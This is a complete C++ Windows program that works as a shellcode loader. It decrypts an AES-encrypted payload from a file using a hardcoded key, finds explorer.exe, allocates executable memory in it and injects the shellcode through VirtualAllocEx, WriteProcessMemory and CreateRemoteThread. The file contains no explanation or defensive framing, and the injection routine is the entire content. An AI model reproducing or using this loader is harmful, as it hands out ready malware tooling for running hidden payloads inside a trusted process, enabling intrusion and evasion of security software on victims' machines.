#include <windows.h>
#include <tlhelp32.h>
#include <wincrypt.h>
#include <iostream>
#include <fstream>

#pragma comment(lib, "crypt32.lib")

// Get PID by name
DWORD GetProcId(const char* procName) {
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);

    DWORD pid = 0;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    while (Process32Next(snapshot, &entry)) {
        if (!_stricmp(entry.szExeFile, procName)) {
            pid = entry.th32ProcessID;
            break;
        }
    }
    CloseHandle(snapshot);
    return pid;
}

int main() {
    // AES key - 16 bytes
    const BYTE aesKey[16] = { 'T','h','i','s','I','s','A','1','6','B','y','t','e','K','e','y' };

    // Read encrypted shellcode
    std::ifstream file("encrypted_payload.bin", std::ios::binary | std::ios::ate);
    if (!file) {
        std::cerr << "[-] Failed to open encrypted_payload.bin\n";
        return 1;
    }

    std::streamsize size = file.tellg();
    file.seekg(0, std::ios::beg);

    BYTE* encData = new BYTE[size];
    if (!file.read((char*)encData, size)) {
        std::cerr << "[-] Failed to read encrypted data\n";
        return 1;
    }

    // Extract IV from the first 16 bytes
    BYTE iv[16];
    memcpy(iv, encData, 16);

    BYTE* cipherText = encData + 16;
    DWORD cipherLen = size - 16;

    BYTE* decrypted = new BYTE[cipherLen];
    memcpy(decrypted, cipherText, cipherLen);  // copy before decrypting in-place

    // Setup Windows Crypto API
    HCRYPTPROV hProv;
    HCRYPTKEY hKey;
    HCRYPTHASH hHash;

    if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        std::cerr << "[-] CryptAcquireContext failed.\n";
        return 1;
    }

    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        std::cerr << "[-] CryptCreateHash failed.\n";
        return 1;
    }

    if (!CryptHashData(hHash, aesKey, sizeof(aesKey), 0)) {
        std::cerr << "[-] CryptHashData failed.\n";
        return 1;
    }

    if (!CryptDeriveKey(hProv, CALG_AES_128, hHash, 0, &hKey)) {
        std::cerr << "[-] CryptDeriveKey failed.\n";
        return 1;
    }

    if (!CryptSetKeyParam(hKey, KP_IV, iv, 0)) {
        std::cerr << "[-] CryptSetKeyParam failed.\n";
        return 1;
    }

    DWORD len = cipherLen;
    if (!CryptDecrypt(hKey, 0, TRUE, 0, decrypted, &len)) {
        std::cerr << "[-] CryptDecrypt failed.\n";
        return 1;
    }

    // Get PID of explorer.exe
    DWORD pid = GetProcId("explorer.exe");
    if (!pid) {
        std::cerr << "[-] Could not find explorer.exe\n";
        return 1;
    }

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        std::cerr << "[-] Failed to open target process\n";
        return 1;
    }

    // Allocate and inject
    LPVOID remoteMem = VirtualAllocEx(hProcess, NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteMem) {
        std::cerr << "[-] VirtualAllocEx failed.\n";
        return 1;
    }

    if (!WriteProcessMemory(hProcess, remoteMem, decrypted, len, NULL)) {
        std::cerr << "[-] WriteProcessMemory failed.\n";
        return 1;
    }

    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteMem, NULL, 0, NULL);
    if (!hThread) {
        std::cerr << "[-] CreateRemoteThread failed.\n";
        return 1;
    }

    std::cout << "[+] Shellcode injected successfully into explorer.exe\n";

    // Cleanup
    delete[] encData;
    delete[] decrypted;
    CloseHandle(hProcess);
    return 0;
}



